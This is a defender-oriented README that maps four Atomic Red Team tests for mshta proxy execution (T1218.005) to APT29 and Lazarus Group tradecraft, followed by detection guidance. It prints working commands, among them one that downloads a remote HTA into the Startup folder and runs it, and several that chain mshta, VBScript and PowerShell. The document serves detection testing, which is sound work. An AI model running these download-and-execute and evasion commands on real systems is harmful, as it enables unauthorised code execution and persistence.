# Atomic Red Team Tests for APT29 and Lazarus Group - T1218.005 Signed Binary Proxy Execution: Mshta

This repository documents selected **Atomic Red Team tests for T1218.005 (Signed Binary Proxy Execution: Mshta)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.

The goal is to:
* Provide defenders with a curated set of relevant tests for detecting mshta abuse activities
* Map each test to known adversary behaviors and campaigns
* Highlight overlap and differences between the groups' execution techniques

---

## Background

* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
  * Frequently uses **living-off-the-land techniques** with legitimate system utilities
  * Employs **mshta.exe** to execute malicious scripts and bypass application controls

* **Lazarus Group** is a North Korean state-sponsored threat group
  * Known for **financial theft campaigns** and destructive attacks
  * Uses **mshta.exe** to execute HTML pages downloaded by initial access documents
  * Leverages trusted Windows utilities to evade detection

Both groups leverage T1218.005 (Mshta) because it allows them to:
* Execute malicious code through a trusted Microsoft-signed binary
* Bypass application control solutions that don't account for mshta abuse
* Execute scripts outside of browser security contexts
* Proxy execution of remote payloads

---

## Selected Atomic Tests for T1218.005

| Test # | Technique | Description | Used By |
|--------|-----------|-------------|---------|
| **2** | Mshta executes VBScript to execute malicious command | Uses VBScript via mshta to run PowerShell commands | **APT29** |
| **3** | Mshta Executes Remote HTML Application (HTA) | Downloads and executes remote HTA file | **Lazarus** |
| **6** | Invoke HTML Application - Direct download from URI | Directly executes HTA from remote URI | **Lazarus** |
| **10** | Mshta used to Execute PowerShell | Uses mshta to execute PowerShell commands | **APT29** |

---

## Detailed Test Analysis

### Atomic Test #2 - Mshta executes VBScript to execute malicious command
**Technique:** VBScript Execution via Mshta  
**Adversary Usage:** APT29  
**Command:**
```cmd
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
```
**Explanation:** APT29 has used mshta.exe to execute VBScript that in turn launches PowerShell commands. This technique allows them to chain multiple execution methods and bypass security controls that might monitor PowerShell directly.

### Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)
**Technique:** Remote HTA Execution  
**Adversary Usage:** Lazarus Group  
**Command:**
```powershell
$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
```
**Explanation:** Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents. This technique allows them to stage payloads from remote locations while leveraging a trusted Windows utility.

### Atomic Test #6 - Invoke HTML Application - Direct download from URI
**Technique:** Direct URI Execution  
**Adversary Usage:** Lazarus Group  
**Command:**
```powershell
Invoke-ATHHTMLApplication -HTAUri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta" -MSHTAFilePath "$env:windir\system32\mshta.exe"
```
**Explanation:** Lazarus Group frequently downloads and executes remote HTA content directly from URIs, demonstrating their preference for direct remote execution without intermediate file stages.

### Atomic Test #10 - Mshta used to Execute PowerShell
**Technique:** PowerShell Execution via Mshta  
**Adversary Usage:** APT29  
**Command:**
```cmd
mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205"""))</script>'"
```
**Explanation:** APT29 has used mshta to execute PowerShell commands, as documented in the 2021 Threat Detection Report by Red Canary. This technique allows them to execute PowerShell while potentially bypassing monitoring that focuses on direct PowerShell execution.

---

## Correlation with APT29 & Lazarus

* **APT29 Focus:**
  * VBScript execution leading to PowerShell (#2, #10)
  * Indirect command execution through trusted utilities
  → Used for stealthy execution during espionage operations

* **Lazarus Group Focus:**
  * Remote HTA execution (#3, #6)
  * Direct download and execution from URIs
  → Used for initial payload delivery and execution chain

* **Overlap:**
  * Both groups abuse **mshta.exe** for execution
  * Both leverage **trusted Windows utilities** to evade detection
  * Both use **multiple execution methods** in chains

---

## Defender Notes

* These tests are high-value because they **closely emulate real-world adversary tradecraft**
* Detection should focus on:
  * mshta.exe executing with unusual parameters (especially with "vbscript:" or "javascript:" prefixes)
  * mshta.exe making network connections to download remote content
  * mshta.exe spawning other processes like PowerShell or cmd
  * mshta.exe executing from unusual directories or with unusual parent processes
* Correlation across events is essential:
  * Process creation + network connections to external domains
  * Unusual parent-child process relationships (e.g., Office applications spawning mshta)
  * Multiple execution methods chained together
* Implement application control to restrict mshta.exe if not needed for business purposes
* Monitor for mshta.exe execution patterns that deviate from normal administrative use

## Campaign References

1. **APT29 Various Campaigns**: Uses mshta to execute VBScript and PowerShell commands for execution
2. **Lazarus Operation Dream Job**: Uses mshta to execute HTML pages downloaded by initial access documents
3. **FIN7 Operations**: Uses mshta.exe to execute VBScript to execute malicious code (as referenced in Atomic Test #2)

## Academic References

1. MITRE ATT&CK Technique T1218.005 - Signed Binary Proxy Execution: Mshta
2. Red Canary: "2021 Threat Detection Report" (APT29 mshta usage)
3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group TTPs)
4. Microsoft: "NOBELIUM targeting IT supply chain" (APT29 techniques)
5. FireEye: "APT29 Domain Fronting With TOR" (2017)